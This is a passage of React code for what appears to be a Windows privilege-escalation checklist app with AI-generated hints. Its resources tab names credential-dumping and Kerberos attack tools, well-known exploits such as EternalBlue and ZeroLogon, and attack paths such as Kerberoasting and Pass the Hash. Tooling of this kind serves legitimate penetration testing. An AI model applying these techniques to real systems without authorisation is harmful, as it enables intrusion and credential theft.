                                  className={`w-4 h-4 mt-0.5 rounded border flex-shrink-0 cursor-pointer flex items-center justify-center transition-all ${
                                    checked[item.id] ? 'bg-emerald-500 border-emerald-500' : 'border-white/20 hover:border-emerald-500/50'
                                  }`}
                                >
                                  {checked[item.id] && <Check size={10} className="text-black" strokeWidth={3} />}
                                </div>

                                <div className="flex-1 min-w-0">
                                  <div className="flex items-center gap-2 mb-1.5 flex-wrap">
                                    <span className={"text-xs " + (checked[item.id] ? 'line-through text-white/30' : 'text-white/80')}>
                                      {item.label}
                                    </span>
                                    <span className={"text-[10px] px-1.5 py-0.5 rounded-full border font-mono " + RISK_COLOR[item.risk] + " " + RISK_BG[item.risk]}>
                                      {item.risk}
                                    </span>
                                  </div>

                                  <div className="flex items-center gap-2 bg-black/30 border border-white/5 rounded-xl px-3 py-1.5 mb-1.5">
                                    <code className="text-emerald-400 text-xs font-mono flex-1 truncate selectable">{item.command}</code>
                                    <CopyBtn text={item.command} />
                                  </div>

                                  <div className="text-white/40 text-xs">ℹ {item.note}</div>

                                  {item.references && item.references.length > 0 && (
                                    <div className="flex gap-2 mt-1 flex-wrap">
                                      {item.references.map((ref, idx) => (
                                        <a key={idx} href={ref} target="_blank" rel="noopener noreferrer"
                                          className="text-cyan-400 text-xs hover:text-cyan-300 transition-colors flex items-center gap-1"
                                        >
                                          Ref <ExternalLink size={9} />
                                        </a>
                                      ))}
                                    </div>
                                  )}

                                  {aiHint[item.id] && (
                                    <div className="mt-2 p-2.5 bg-cyan-500/5 border border-cyan-500/20 rounded-xl">
                                      <span className="text-cyan-400 font-semibold text-xs">🤖 AI: </span>
                                      <AIResponseText text={aiHint[item.id]} className="text-xs text-white/70 leading-relaxed" />
                                    </div>
                                  )}
                                </div>

                                <button
                                  onClick={() => getHint(item)}
                                  className="flex-shrink-0 flex items-center gap-1 text-xs text-white/30 hover:text-cyan-400 transition-colors mt-0.5"
                                  disabled={ollamaAvailable === false}
                                  title={ollamaAvailable === false ? 'Ollama offline' : ''}
                                >
                                  {loadingHint[item.id]
                                    ? <span className="animate-pulse text-cyan-400">...</span>
                                    : <><Cpu size={11} />{aiHint[item.id] ? 'hide' : 'explain'}</>
                                  }
                                </button>
                              </div>
                            </div>
                          )
                        })}
                      </div>
                    )}
                  </div>
                )
              })}
            </div>

            {searchTerm && filteredCategories.length === 0 && (
              <div className="text-center py-10 text-white/40 text-sm">
                No checks match "<span className="text-white/60">{searchTerm}</span>"
              </div>
            )}

            {/* Notes section */}
            {(done > 0 || notes) && (
              <div className="mt-6 bg-white/5 border border-white/5 rounded-2xl p-4">
                <div className="flex items-center justify-between mb-2">
                  <div className="text-white/40 text-xs font-mono flex items-center gap-1">
                    <FileText size={12} />
                    Notes
                  </div>
                  <button 
                    onClick={() => setEditingNote(!editingNote)}
                    className="text-xs text-white/40 hover:text-cyan-400 transition-colors"
                  >
                    {editingNote ? 'Cancel' : 'Add Note'}
                  </button>
                </div>
                {editingNote ? (
                  <div>
                    <textarea
                      value={notes}
                      onChange={e => setNotes(e.target.value)}
                      placeholder="Add notes about your progress..."
                      rows={2}
                      className="w-full bg-black/30 border border-white/10 rounded-xl px-3 py-2 text-sm text-white/80 font-mono focus:outline-none focus:border-cyan-500/30"
                    />
                    <button
                      onClick={saveChecklist}
                      className="mt-2 px-3 py-1.5 bg-emerald-500/20 text-emerald-400 text-xs font-mono rounded-xl hover:bg-emerald-500/30 border border-emerald-500/30 transition-colors"
                    >
                      Save Notes & Progress
                    </button>
                  </div>
                ) : (
                  <div className="text-white/40 text-sm">
                    {notes || 'No notes added yet.'}
                  </div>
                )}
              </div>
            )}
          </>
        )}

        {/* ── History Tab ── */}
        {activeTab === 'history' && (
          <div className="space-y-4">
            <div className="flex items-center justify-between flex-wrap gap-2">
              <div className="text-white/40 text-xs font-mono">
                {savedChecklists.length} saved checklists
              </div>
              <div className="flex gap-2 flex-wrap">
                <button 
                  onClick={exportChecklists} 
                  disabled={savedChecklists.length === 0}
                  className="flex items-center gap-1 text-xs text-white/40 hover:text-white/80 transition-colors px-3 py-1.5 border border-white/10 rounded-xl disabled:opacity-40"
                >
                  <Download size={12} /> Export
                </button>
                <button 
                  onClick={() => fileInputRef.current?.click()} 
                  className="flex items-center gap-1 text-xs text-white/40 hover:text-white/80 transition-colors px-3 py-1.5 border border-white/10 rounded-xl"
                >
                  <Upload size={12} /> Import
                </button>
                <input
                  ref={fileInputRef}
                  type="file"
                  accept=".json"
                  onChange={importChecklists}
                  className="hidden"
                />
                <button 
                  onClick={clearAllChecklists} 
                  disabled={savedChecklists.length === 0}
                  className="flex items-center gap-1 text-xs text-red-400/50 hover:text-red-400 transition-colors px-3 py-1.5 border border-red-500/20 rounded-xl disabled:opacity-40"
                >
                  <Trash2 size={12} /> Clear All
                </button>
              </div>
            </div>

            {savedChecklists.length === 0 ? (
              <div className="bg-white/5 border border-white/5 rounded-2xl p-12 text-center">
                <Shield size={32} className="text-white/20 mx-auto mb-3" />
                <div className="text-white/40 text-sm font-mono">No saved checklists</div>
                <div className="text-white/20 text-xs mt-1">Complete some checks and save your progress</div>
              </div>
            ) : (
              <div className="space-y-2">
                {savedChecklists.map(c => {
                  const items = Object.values(c.checked).filter(Boolean).length
                  return (
                    <div key={c.id} className="bg-white/5 border border-white/5 rounded-xl p-4 hover:border-cyan-500/20 transition-all">
                      <div className="flex items-start justify-between gap-2">
                        <div className="flex-1 min-w-0">
                          <div className="flex items-center gap-2 flex-wrap">
                            <button
                              onClick={() => loadChecklist(c)}
                              className="text-cyan-400 hover:text-cyan-300 font-mono text-sm font-bold transition-colors"
                            >
                              {new Date(c.timestamp).toLocaleString()}
                            </button>
                            <span className="text-white/40 text-xs">
                              {items}/{total} checks
                            </span>
                            <span className="text-white/40 text-xs">
                              {Math.round((items/total)*100)}%
                            </span>
                            {c.favorite && (
                              <Star size={12} className="text-yellow-400" />
                            )}
                          </div>
                          {c.notes && (
                            <div className="text-white/40 text-xs mt-1">{c.notes}</div>
                          )}
                          <div className="flex flex-wrap gap-1 mt-1">
                            {Object.entries(c.checked)
                              .filter(([, checked]) => checked)
                              .slice(0, 5)
                              .map(([id]) => {
                                const item = CATEGORIES.flatMap(cat => cat.items).find(i => i.id === id)
                                return item ? (
                                  <span key={id} className={`text-[8px] px-1 py-0.5 rounded font-mono ${RISK_COLOR[item.risk]} ${RISK_BG[item.risk]}`}>
                                    {item.label.slice(0, 15)}...
                                  </span>
                                ) : null
                              })}
                            {Object.values(c.checked).filter(Boolean).length > 5 && (
                              <span className="text-[8px] text-white/30">+{Object.values(c.checked).filter(Boolean).length - 5} more</span>
                            )}
                          </div>
                        </div>
                        <div className="flex gap-1 flex-shrink-0">
                          <button
                            onClick={() => toggleFavorite(c.id)}
                            className="p-1.5 rounded-lg text-white/30 hover:text-yellow-400 transition-colors"
                          >
                            <Star size={14} className={c.favorite ? 'text-yellow-400' : ''} />
                          </button>
                          <button
                            onClick={() => loadChecklist(c)}
                            className="p-1.5 rounded-lg text-white/30 hover:text-cyan-400 transition-colors"
                          >
                            <Play size={14} />
                          </button>
                          <button
                            onClick={() => deleteChecklist(c.id)}
                            className="p-1.5 rounded-lg text-white/30 hover:text-red-400 transition-colors"
                          >
                            <Trash2 size={14} />
                          </button>
                        </div>
                      </div>
                    </div>
                  )
                })}
              </div>
            )}
          </div>
        )}

        {/* ── Resources Tab ── */}
        {activeTab === 'resources' && (
          <div className="space-y-4">
            <div className="bg-white/5 border border-white/5 rounded-2xl p-5">
              <h3 className="text-sm font-bold text-cyan-400 mb-3 flex items-center gap-2">
                <Zap size={14} /> Essential Windows Privesc Resources
              </h3>
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 text-xs">
                <div>
                  <h4 className="font-semibold text-amber-400 mb-2">Tools</h4>
                  <ul className="space-y-1.5 text-white/40 font-mono">
                    <li>• WinPEAS — Automated enumeration</li>
                    <li>• PowerUp — Privilege escalation checks</li>
                    <li>• Mimikatz — Credential dumping</li>
                    <li>• Rubeus — Kerberos attacks</li>
                    <li>• Certify — ADCS enumeration</li>
                  </ul>
                </div>
                <div>
                  <h4 className="font-semibold text-amber-400 mb-2">Common Exploits</h4>
                  <ul className="space-y-1.5 text-white/40 font-mono">
                    <li>• PrintNightmare (CVE-2021-34527)</li>
                    <li>• EternalBlue (MS17-010 / CVE-2017-0144)</li>
                    <li>• Potato attacks (Juicy/Rogue)</li>
                    <li>• ZeroLogon (CVE-2020-1472)</li>
                    <li>• PetitPotam (NTLM relay)</li>
                  </ul>
                </div>
              </div>
            </div>

            <div className="bg-white/5 border border-white/5 rounded-2xl p-5">
              <h3 className="text-sm font-bold text-amber-400 mb-3 flex items-center gap-2">
                <Target size={14} /> Quick Attack Paths
              </h3>
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 text-xs">
                <div className="p-3 bg-black/30 border border-white/5 rounded-xl">
                  <h4 className="font-bold text-red-400 mb-1">Local Privilege Escalation</h4>
                  <ul className="space-y-1 text-white/40">
                    <li>• Unquoted service paths</li>
                    <li>• Weak service permissions</li>
                    <li>• AlwaysInstallElevated</li>
                    <li>• Token privileges (SeImpersonate)</li>
                  </ul>
                </div>
                <div className="p-3 bg-black/30 border border-white/5 rounded-xl">
                  <h4 className="font-bold text-amber-400 mb-1">Domain Privilege Escalation</h4>
                  <ul className="space-y-1 text-white/40">
                    <li>• Kerberoasting</li>
                    <li>• AS-REP Roasting</li>
                    <li>• ADCS (ESC1-ESC8)</li>
                    <li>• Pass the Hash/Ticket</li>
                  </ul>
                </div>
              </div>
            </div>

            <div className="bg-white/5 border border-white/5 rounded-2xl p-5">
              <h3 className="text-sm font-bold text-cyan-400 mb-3 flex items-center gap-2">
                <Sparkles size={14} /> AI Commands
              </h3>
              <div className="grid grid-cols-1 gap-2">
                <div className="flex items-center gap-2 bg-black/30 border border-white/5 rounded-xl px-3 py-1.5">
                  <code className="text-emerald-400 text-xs font-mono flex-1">Explain this command: whoami /priv</code>
                  <CopyBtn text="Explain this command: whoami /priv" />
                </div>
                <div className="flex items-center gap-2 bg-black/30 border border-white/5 rounded-xl px-3 py-1.5">
                  <code className="text-emerald-400 text-xs font-mono flex-1">How to check for unquoted service paths?</code>
                  <CopyBtn text="How to check for unquoted service paths?" />
                </div>
                <div className="flex items-center gap-2 bg-black/30 border border-white/5 rounded-xl px-3 py-1.5">
                  <code className="text-emerald-400 text-xs font-mono flex-1">Find privilege escalation vectors on Windows</code>
                  <CopyBtn text="Find privilege escalation vectors on Windows" />
                </div>
              </div>
            </div>
          </div>
        )}
      </div>

      <style dangerouslySetInnerHTML={{ __html: `
        .custom-scrollbar::-webkit-scrollbar { width: 3px; }
        .custom-scrollbar::-webkit-scrollbar-track { background: transparent; }
        .custom-scrollbar::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.1); border-radius: 10px; }
        .custom-scrollbar::-webkit-scrollbar-thumb:hover { background: rgba(255,255,255,0.2); }
      `}} />
    </div>
  )
}